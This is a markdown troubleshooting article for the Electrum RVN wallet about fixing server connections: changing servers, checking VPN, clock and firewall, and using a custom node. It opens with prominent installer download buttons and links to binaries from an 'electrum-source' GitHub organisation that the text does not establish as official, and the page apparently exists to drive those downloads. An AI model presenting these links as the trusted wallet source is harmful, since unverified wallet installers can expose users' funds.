![Electrum RVN](assets/banner-article.png)

# Electrum RVN Will Not Connect to a Server

<!-- compact-download-block -->

<p align="center">Address, port and server before a reinstall</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
A wallet that will not connect needs a different server, a clear network path, and a current build - in roughly that order. The common causes are a stale or unreachable server in the list, a VPN or firewall in the way, and an out-of-date client whose connection settings no longer match what servers accept.

## Start with the server, not the wallet

The wallet is a light client: it reads the chain by asking servers. If it has no server it can reach, it has nothing to show, and no amount of reinstalling changes that.

**Try another server from the list.** If a different server connects, the first one was unreachable, overloaded or out of date. That is the most common single cause and the fastest test.

**If the list itself will not load**, the network path is the problem rather than any one server - go to the network checks below.

**If every server fails**, the wallet's outbound connection is blocked or the clock is wrong.

## The network checks

**VPN or proxy.** Turn it off and retry. VPN routes and proxies can block or break the connection the wallet needs.

**Captive portal.** Hotel and guest networks intercept traffic until you accept terms in a browser. Complete that, then reconnect.

**System clock.** Certificates are time-sensitive; a clock that is hours off fails TLS to every server. Turn on automatic time.

**Firewall.** A rule blocking the wallet's outbound connection looks exactly like a dead server. Allow the application and retry.

**A second network.** Tether to a phone. If it connects there, the problem is your network, and you have narrowed it to a router, a VPN or a firewall in one step.

## If you are connecting to your own node

A custom server adds its own failure modes:

- **the host and port are wrong** - the wallet needs the Electrum server's port, not the node's RPC port;
- **TLS mismatch** - a server offering a self-signed certificate needs the wallet configured to accept it, or a proper certificate;
- **the server is not running or not reachable** from this machine;
- **the node is still syncing**, so the server answers but knows nothing recent.

Test with the node's own tooling first: if the Electrum server is not answering locally, the wallet will not see it from anywhere.

## A current build matters

Connection requirements change: server lists are updated, TLS settings tighten, and older clients can be refused by servers that have moved on. A wallet that connects on one machine and not another is often a version difference - the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0.

That is not a reason to reinstall in a loop. Update once, then go back to the server and network checks.

## When it connects but the balance is wrong

Connection is not the same as a correct view. If the indicator is green and the balance is off:

- **rescan**, so the wallet re-queries its addresses rather than trusting a cache;
- **switch server**, because a server that is behind gives a stale picture;
- **check the network** - testnet versus mainnet;
- **check which wallet file is open**.

[Electrum RVN not syncing](https://github.com/electrum-source/token-and-network/blob/main/electrum-rvn-not-syncing.md) covers the case where even the connection is unreliable, and [zero balance after restoring Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/zero-balance-after-restoring-electrum-rvn.md) is the derivation-path case that masks itself as a connection problem.

## What never fixes a connection

**Reinstalling over and over.** It does not change the network path.

**Restoring your seed.** Syncing and seed validity are separate; a restore does not repair a blocked port.

**Disabling security software entirely.** It may make the symptom disappear and leaves you worse off.

**Entering your seed anywhere that offers to "fix" the connection.** There is no legitimate service that needs it - [how safe is Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/how-safe-is-electrum-rvn.md).

## Running your own server, briefly

If connectivity problems keep recurring, or if you would rather not depend on a stranger's server at all, point the wallet at your own node with an Electrum server in front of it. That removes the public-server variable entirely and improves privacy - [does Electrum RVN need a full node?](https://github.com/electrum-source/download-and-setup/blob/main/does-electrum-rvn-need-a-full-node.md) and [Ravencoin privacy with Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/ravencoin-privacy-with-electrum-rvn.md).

The trade is maintenance: a server you run is one you have to keep running. For most readers, a public server that responds well is the right default.

## A short checklist to keep

1. Another server.
2. VPN off, clock right, portal accepted.
3. Second network.
4. Update once.
5. Rescan.

Five steps, two minutes, and it resolves almost every connection report. If it does not, the wallet is probably fine and the path to the internet is not.

## Related failures

A transaction that broadcast but will not confirm is a fee problem, not a connection one - [stuck Ravencoin transaction in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/stuck-ravencoin-transaction-in-electrum-rvn.md). A payment that never arrives may have gone to the wrong address - [wrong address sends in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/wrong-address-sends-in-electrum-rvn.md). A missing mining payout is usually the pool's address setting rather than anything the wallet is doing. A missing asset after issuance is a display problem rather than a connection one, and [Ravencoin fee estimation in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/ravencoin-fee-estimation-in-electrum-rvn.md) is what the server you connect to is being asked for when you send.

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. If a fresh install on a different network connects immediately, the wallet was never the problem.

## FAQ

### Why can't my wallet connect to any server?

Usually the network path: a VPN, a firewall, a captive portal, or a system clock far enough off to break TLS. Test on a phone hotspot to confirm.

### Is it safe to use a public server?

It sees which addresses you ask about and cannot spend your funds. For privacy, run your own - the wallet supports pointing at a node you control.

### Should I reinstall?

Once, if your build is old. Repeated reinstalls do not change a blocked connection.

### What if the server list will not load?

That is a network failure rather than a server failure. Check the VPN, the portal and the clock before anything else.

### Can I connect through Tor?

The wallet's server settings are the place to look for what your build supports; if the option is not there, the build does not offer it - check the current release.

<!-- related-articles -->

## Related articles

- [Electrum RVN Not Syncing](https://github.com/electrum-source/token-and-network/blob/main/electrum-rvn-not-syncing.md)
- [Zero Balance After Restoring Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/zero-balance-after-restoring-electrum-rvn.md)
- [How Safe Is Electrum RVN?](https://github.com/electrum-source/passphrase-backup/blob/main/how-safe-is-electrum-rvn.md)
- [Does Electrum RVN Need a Full Node?](https://github.com/electrum-source/download-and-setup/blob/main/does-electrum-rvn-need-a-full-node.md)
